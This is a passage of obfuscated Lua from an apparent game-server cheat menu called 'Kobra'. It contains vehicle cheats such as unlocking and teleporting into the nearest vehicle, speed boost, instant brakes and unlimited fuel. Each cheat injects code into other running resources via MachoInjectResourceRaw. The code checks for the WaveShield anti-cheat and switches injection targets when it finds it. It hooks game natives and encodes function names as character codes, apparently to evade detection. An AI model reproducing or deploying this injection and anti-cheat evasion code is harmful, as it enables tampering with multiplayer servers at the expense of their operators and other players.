                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);break;end end else MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);end break;end end end},{type="button",label="Delete Vehicle",onSelect=function() local v457=0 -0 ;while true do if (v457==0) then v12:Notify("success","Kobra","Deleted Vehicle",3924 -(837 + 87) );MachoInjectResourceRaw("any",[[
                            local function LXpTqWvR80()
                                local aQw = PlayerPedId
                                local bEr = GetVehiclePedIsIn
                                local cTy = DoesEntityExist
                                local dUi = NetworkHasControlOfEntity
                                local eOp = SetEntityAsMissionEntity
                                local fAs = DeleteEntity
                                local gDf = DeleteVehicle
                                local hJk = SetVehicleHasBeenOwnedByPlayer

                                local ped = aQw()
                                local veh = bEr(ped, false)

                                if veh and veh ~= 0 and cTy(veh) then
                                    hJk(veh, true)
                                    eOp(veh, true, true)

                                    if dUi(veh) then
                                        fAs(veh)
                                        gDf(veh)
                                    end
                                end

                            end

                            LXpTqWvR80()
                            ]]);break;end end end},{type="button",label="Unlock Closest Vehicle",onSelect=function() local v458=0 -0 ;while true do if (v458==0) then v12:Notify("success","Kobra","Deleted Vehicle",4670 -(837 + 833) );MachoInjectResourceRaw("any",[[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end

                            end

                            TpLMqKtXwZ()
                            ]]);break;end end end},{type="button",label="Teleport into Closest Vehicle",onSelect=function() local v459=0 + 0 ;while true do if ((1387 -(356 + 1031))==v459) then v12:Notify("success","Kobra","Teleported into Vehicle",1365 + 1635 );MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            local function uPKcoBaEHmnK()
                                local ziCFzHyzxaLX = SetPedIntoVehicle
                                local YPPvDlOGBghA = GetClosestVehicle

                                local Coords = GetEntityCoords(PlayerPedId())
                                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                    else
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                    end
                                end
                            end

                            uPKcoBaEHmnK()
                            ]]);break;end end end},{type="divider",label="Toggles"},{type="checkbox",label="Boost Vehicle",checked=false,onSelect=function(v460) if v460 then v12:Notify("success","Kobra","Boost Vehicle On",3234 -(7 + 227) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[SuperSpeedBoost] Coroutine error: ^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]]);end else v12:Notify("error","Kobra","Boost Vehicle Off",4927 -1927 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.superSpeedBoost = false
                                        ]]);else v48("any",[[
                                            VkLpOiUyTrEq = false
                                        ]]);end end end},{type="checkbox",label="Instant Brakes",checked=false,onSelect=function(v461) local v462=GetResourceState("WaveShield")=="started" ;local v463=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v461 then if v462 then v12:Notify("success","Kobra","Instant Brakes On",9412 -6412 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return PlayerPedId() end
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                while VkLpOiUyTrEq and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    ::continue::
                                                end

                                                -- Restore on disable
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        -- No need to restore speed, just stop forcing 0
                                                    end
                                                end
                                            end)
                                        ]]);else local v796=0 + 0 ;while true do if (v796==(0 + 0)) then v48(v463,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while VkLpOiUyTrEq and not Unloaded do
                                                        local ped = LkJhGfDsAzXv()
                                                        local veh = PoLkJhBgVfCd(ped, false)
                                                        if veh and veh ~= 0 then
                                                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                                VbNmQwErTyUi(veh, 0.0)
                                                            end
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            YgT7FrqXcN()
                                        ]]);v12:Notify("success","Kobra","Instant Brakes On (Fallback)",3000);break;end end end elseif v462 then local v797=0 + 0 ;while true do if (v797==(0 -0)) then v12:Notify("success","Kobra","Instant Brakes Off",3260 -(197 + 63) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            VkLpOiUyTrEq = false
                                        ]]);break;end end else local v798=0 + 0 ;while true do if ((0 + 0)==v798) then v48(v463,[[
                                            VkLpOiUyTrEq = false
                                        ]]);v12:Notify("success","Kobra","Instant Brakes Off (Fallback)",1566 + 1434 );break;end end end end},{type="checkbox",label="Easy Handling",checked=false,onSelect=function(v464) local v465=0;local v466;local v467;while true do if (v465==(0 -0)) then v466=GetResourceState("WaveShield")=="started" ;v467=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v465=1370 -(618 + 751) ;end if (v465==1) then if v464 then if v466 then local v1034=0;while true do if (v1034==(0 + 0)) then v12:Notify("success","Kobra","Easy Handling On",3000);MachoInjectResourceRaw("WaveShield",[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return GetPlayerPed(-1) end
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                while NvGhJkLpOiUy and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    ::continue::
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else v48(v467,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function KbZwVoYtLx()
                                                local BtGhYtUlOpLk = CreateThread
                                                local WeRtYuIoPlMn = PlayerPedId
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                BtGhYtUlOpLk(function()
                                                    while NvGhJkLpOiUy and not Unloaded do
                                                        local ped = WeRtYuIoPlMn()
                                                        local veh = TyUiOpAsDfGh(ped, false)
                                                        if veh and veh ~= 0 then
                                                            UyTrBnMvCxZl(veh, 73.0)
                                                            PlMnBvCxZaSd(veh, true)
                                                        end
                                                        Wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end)
                                            end

                                            KbZwVoYtLx()
                                        ]]);v12:Notify("success","Kobra","Easy Handling On (Fallback)",4910 -(206 + 1704) );end elseif v466 then v12:Notify("success","Kobra","Easy Handling Off",3000);MachoInjectResourceRaw("WaveShield",[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);else v48(v467,[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);v12:Notify("success","Kobra","Easy Handling Off (Fallback)",5054 -2054 );end break;end end end},{type="checkbox",label="Rainbow Vehicle",checked=false,onSelect=function(v468) local v469=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v468 then v12:Notify("success","Kobra","Rainbow Vehicle On",1309 + 1691 );if (GetResourceState("WaveShield")=="started") then print("souygdfg");v48(v469,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.osintRainbow.originals[name] then
                                                    _G.osintRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.osintRainbow.thread then
                                                _G.osintRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.osintRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.osintRainbow.enabled and coroutine.status(_G.osintRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.osintRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]]);else v48(v469,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]]);end else local v623=1275 -(155 + 1120) ;while true do if (v623==(1506 -(396 + 1110))) then v12:Notify("error","Kobra","Rainbow Vehicle Off",6776 -3776 );if (GetResourceState("WaveShield")=="started") then local v1035=0 + 0 ;while true do if (v1035==(0 + 0)) then print("swave");v48(v469,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = false

                                            for name, orig in pairs(_G.osintRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.osintRainbow.thread and coroutine.status(_G.osintRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.osintRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]]);break;end end else v48(v469,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]]);end break;end end end end},{type="checkbox",label="Unlimited Fuel",checked=false,onSelect=function(v470) if v470 then local v624=976 -(230 + 746) ;while true do if (v624==(601 -(473 + 128))) then v12:Notify("success","Kobra","Unlimited Fuel On",3048 -(39 + 9) );v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                BlNkJmLzXcVb = true

                                local function LqWyXpR3tV()
                                    local TmPlKoMiJnBg = CreateThread
                                    local ZxCvBnMaSdFg = PlayerPedId
                                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                                    local VcXzQwErTyUi = GetVehiclePedIsIn
                                    local KpLoMkNjBhGt = DoesEntityExist
                                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                                    TmPlKoMiJnBg(function()
                                        while BlNkJmLzXcVb and not Unloaded do
                                            local ped = ZxCvBnMaSdFg()
                                            if YhUjIkOlPlMn(ped, false) then
                                                local veh = VcXzQwErTyUi(ped, false)
